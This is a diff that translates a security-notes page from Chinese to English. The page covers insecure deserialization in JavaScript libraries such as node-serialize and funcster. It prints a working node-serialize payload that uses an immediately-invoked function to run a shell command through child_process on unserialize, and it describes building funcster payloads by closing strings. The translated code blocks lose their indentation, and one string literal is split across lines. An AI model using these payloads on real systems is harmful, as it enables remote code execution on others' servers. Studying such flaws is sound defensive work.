@@ -1,46 +1,47 @@
-反序列化
+Deserialization
 ========================================
 
-简介
+Introduction
 ----------------------------------------
-JavaScript本身并没有反序列化的实现，但是一些库如node-serialize、serialize-to-js等支持了反序列化功能。这些库通常使用JSON形式来存储数据，但是和原生函数JSON.parse、 JSON.stringify不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。
+JavaScript itself does not have a deserialization implementation, but some libraries such as node-serialize, serialize-to-js, etc. support the deserialization function. These libraries usually use JSON to store data, but unlike native functions JSON.parse and JSON.stringify, these libraries support deserialization of any object, especially functions. If used improperly, deserialization problems may occur.
 
-Payload构造
+Payload construct
 ----------------------------------------
-下面是一个最简单的例子，首先获得序列化后的输出
+Here is the simplest example, first obtain the serialized output
 
 .. code-block:: javascript
 
-    var y = {
-     rce : function(){
-     require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
-     },
-    }
-    var serialize = require('node-serialize');
-    console.log("Serialized: \n" + serialize.serialize(y));
+var y = {
+rce : function(){
+require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+},
+}
+var serialize = require('node-serialize');
+console.log("Serialized: 
+" + serialize.serialize(y));
 
-上面执行后会返回
-
-.. code-block:: javascript
-
-    {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}"}
-
-不过这段payload反序列化后并不会执行，但是在JS中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如 ``(function () { /* code */ } ());`` 这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的payload测试如下:
-
+After execution above, it will return
 
 .. code-block:: javascript
 
-    var serialize = require('node-serialize');
-    var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
-    serialize.unserialize(payload);
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}"}
+
+However, this payload will not be executed after deserialization, but it supports Immediately Invoked Function Expression in JS, such as ``(function () { /* code */ } ());` ` This will execute the code in the function. Then you can use this method to modify the serialized string to complete a deserialization. The final payload test is as follows:
 
 
-Payload构造 II
+.. code-block:: javascript
+
+var serialize = require('node-serialize');
+var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
+serialize.unserialize(payload);
+
+
+Payload Construct II
 ----------------------------------------
-以上提到的是node-serialize这类反序列化库的构造方式，还有一类库如funcster，是使用直接拼接字符串构造函数的方式来执行。
+The above mentioned is the construction method of deserialization libraries such as node-serialize. There is also a type of library such as funcster, which is executed using the method of directly splicing string constructors.
 
 .. code-block:: javascript
 
-    return "module.exports=(function(module,exports){return{" + entries + "};})();";
+return "module.exports=(function(module,exports){return{" + entries + "};})();";
 
-这种方式可以使用相应的闭合来构造payload。
+This way, the payload can be constructed using the corresponding closure.
